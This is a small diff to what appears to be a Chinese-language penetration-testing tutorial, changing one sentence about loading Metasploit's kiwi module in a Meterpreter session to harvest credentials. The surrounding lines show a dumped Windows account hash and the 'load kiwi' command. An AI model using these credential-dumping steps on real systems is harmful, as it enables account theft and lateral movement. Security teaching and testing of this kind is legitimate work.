@@ -721,7 +721,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f0d8c96aa9cc58f05549e55e
 
 > 注：msf 中 mimikatz 扩展名已由 kiwi 代替。
 
-加载 kiwi 模块，获取所有主机上的所有凭据：
+加载 kiwi 模块，获取主机上的所有凭据：
 
 ```console
 meterpreter > load kiwi
